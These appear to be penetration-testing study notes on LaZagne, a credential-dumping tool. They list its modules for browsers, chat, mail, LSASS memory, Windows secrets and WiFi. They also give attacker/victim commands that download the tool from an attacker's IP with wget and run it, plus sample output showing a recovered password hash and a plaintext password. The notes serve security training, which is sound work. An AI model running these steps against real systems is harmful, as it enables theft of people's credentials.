# LaZagne
- quickly discovers credentials that web browsers or other apps may insecurely store
- made up of modules which each target different software
|**Module**|**Description**|
|---|---|
|browsers|Extracts passwords from various browsers including Chromium, Firefox, Microsoft Edge, and Opera|
|chats|Extracts passwords from various chat applications including Skype|
|mails|Searches through mailboxes for passwords including Outlook and Thunderbird|
|memory|Dumps passwords from memory, targeting KeePass and LSASS|
|sysadmin|Extracts passwords from the configuration files of various sysadmin tools like OpenVPN and WinSCP|
|windows|Extracts Windows-specific credentials targeting LSA secrets, Credential Manager, and more|
|wifi|Dumps WiFi credentials|
  
in order to get LaZagne to work on Linux, you have to zip up the repo and send the entire thing over
```Markdown
# On attacker
tar czf lazagne.tgz LaZagne
# On victim
wget <IP>:<port>/lazagne.tgz
tar xzf lazagne.tgz
cd LaZagne
python3 LaZagne.py
```
```Markdown
Nathan2112@htb[/htb]$ sudo python2.7 laZagne.py all
|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|
------------------- Shadow passwords -----------------
[+] Hash found !!!
Login: systemd-coredump
Hash: !!:18858::::::
[+] Hash found !!!
Login: sambauser
Hash: $6$wgK4tGq7Jepa.V0g$QkxvseL.xkC3jo682xhSGoXXOGcBwPLc2CrAPugD6PYXWQlBkiwwFs7x/fhI.8negiUSPqaWyv7wC8uwsWPrx1:18862:0:99999:7:::
[+] Password found !!!
Login: cry0l1t3
Password: WLpAEXFa0SbqOHY

[+] 3 passwords have been found.
For more information launch it again with the -v option
elapsed time = 3.50091600418
```